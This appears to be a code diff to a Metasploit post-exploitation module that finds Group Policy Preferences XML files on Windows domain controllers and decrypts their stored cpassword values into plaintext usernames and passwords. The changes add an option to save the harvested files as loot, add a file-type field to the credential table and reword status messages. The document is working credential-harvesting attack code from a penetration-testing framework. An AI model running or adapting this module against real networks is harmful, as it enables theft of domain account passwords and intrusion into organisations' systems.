@@ -46,8 +46,10 @@ class Metasploit3 < Msf::Post
 		))
 
 		register_options([
-			OptBool.new('ALL', [ false, 'Enumerate all domains on network.', true]),
+			OptBool.new('ALL', [false, 'Enumerate all domains on network.', true]),
+			OptBool.new('STORE', [false, 'Store the enumerated files in loot.', true]),
 			OptString.new('DOMAINS', [false, 'Enumerate list of space seperated domains DOMAINS="dom1 dom2".'])], self.class)
+			
 	end
 
 	def run
@@ -67,27 +69,32 @@ class Metasploit3 < Msf::Post
 		basepaths = []
 		fullpaths = []
 
-		print_status "Checking locally.."
+		print_status "Checking locally..."
 		locals = get_basepaths(client.fs.file.expand_path("%SYSTEMROOT%\\SYSVOL\\sysvol"))
 		unless locals.blank?
 			basepaths << locals
-			print_good "Policy Shares found locally"
+			print_good "Group Policy Files found locally"
 		end
 
+		# If user supplied domains this implicitly cancels the ALL flag. 
 		if datastore['ALL'] and datastore['DOMAINS'].blank?
+			print_status "Enumerating Domains on the Network..."
 			domains = enum_domains
 			domains.reject!{|n| n == "WORKGROUP" || n.to_s.empty?}
 		end
 
 		# Add user specified domains to list.
-		if datastore['DOMAINS']
+		if !datastore['DOMAINS'].blank?
 			user_domains = datastore['DOMAINS'].split(' ')
-			print_status "Looking for the user supplied domains: #{user_domains}"
-			user_domains.each{|ud| domains << ud} if datastore['DOMAINS']
+			user_domains = user_domains.map {|x| x.upcase}
+			print_status "Enumerating the user supplied Domain(s): #{user_domains.join(', ')}..."
+			user_domains.each{|ud| domains << ud}
 		end
 		
-		# If we find a local policy store then assume we are on DC and do not wish to enumerate the current DC again. 
-		if locals.blank?
+		# If we find a local policy store then assume we are on DC and do not wish to enumerate the current DC again.
+		# If user supplied domains we do not wish to enumerate registry retrieved domains.
+		if locals.blank? && user_domains.blank?
+			print_status "Enumerating Domains in the local registry..."
 			domains << get_domain_reg
 		end	
 		
@@ -159,7 +166,7 @@ class Metasploit3 < Msf::Post
 
 
 	def find_path(path, xml_path)
-		xml_path = "#{path}\\#{xml_path}"
+		xml_path = "#{path}#{xml_path}"
 		begin
 			return xml_path if client.fs.file.stat(xml_path)
 		rescue Rex::Post::Meterpreter::RequestError => e
@@ -196,6 +203,7 @@ class Metasploit3 < Msf::Post
 	def parse_xml(xmlfile)
 		mxml = xmlfile[:xml]
 		print_status "Parsing file: #{xmlfile[:path]} ..."
+		filetype = xmlfile[:path].split('\\').last()
 		mxml.elements.to_a("//Properties").each do |node|
 			epassword = node.attributes['cpassword']
 			next if epassword.to_s.empty?
@@ -223,7 +231,8 @@ class Metasploit3 < Msf::Post
 				]
 			)
 
-			table << ["USERNAME", user ]
+			table << ["Type", filetype]
+			table << ["USERNAME", user]
 			table << ["PASSWORD", pass]
 			table << ["DOMAIN CONTROLLER", xmlfile[:dc]]
 			table << ["DOMAIN", xmlfile[:domain] ]
@@ -233,17 +242,20 @@ class Metasploit3 < Msf::Post
 			table << ["DISABLED", disabled] unless disabled.blank?
 
 			print_good table.to_s
+			
+			store_data(xmlfile[:xml], filetype, xmlfile[:path])
+			
 			report_creds(user,pass) unless disabled and disabled == '1'
 		end
 	end
-
-	#	
-	# Save the raw version of unattend.xml	
-	#	
-	def save_raw(data)		
-		store_loot('windows.gpp.raw', 'text/xml', session, data)	
-	end
 	
+	def store_data(data, filename, path)
+		if datastore['STORE']
+			stored_path = store_loot('windows.gpp.xml', 'text/plain', session, data, filename, path)	
+			print_status("XML file saved to: #{stored_path}")
+		end	
+	end
+			
 	def report_creds(user, pass)
 		if session.db_record
 			source_id = session.db_record.id
@@ -280,7 +292,6 @@ class Metasploit3 < Msf::Post
 
 
 	def enum_domains
-		print_status "Enumerating Domains on the Network..."
 		domain_enum = 0x80000000 # SV_TYPE_DOMAIN_ENUM
 		buffersize = 500
 		result = client.railgun.netapi32.NetServerEnum(nil,100,4,buffersize,4,4,domain_enum,nil,nil)
@@ -298,7 +309,7 @@ class Metasploit3 < Msf::Post
 		end
 
 		count = result['totalentries']
-		print_status("#{count} domain(s) found.")
+		print_status("#{count} Domain(s) found.")
 		startmem = result['bufptr']
 
 		base = 0
@@ -318,7 +329,9 @@ class Metasploit3 < Msf::Post
 				domains << x[:domain]
 				base = base + 8
 		end
-
+		
+		domains.uniq!
+		print_status "Retrieved Domain(s) #{domains.join(', ')} from network"
 		return domains
 	end
 
@@ -375,7 +388,8 @@ class Metasploit3 < Msf::Post
 		end
 		
 		domains.uniq!
-	    print_status "Retrieved domains #{domains} from registry"
+	    print_status "Retrieved Domain(s) #{domains.join(', ')} from registry"
+		
 		return domains
 	end
 
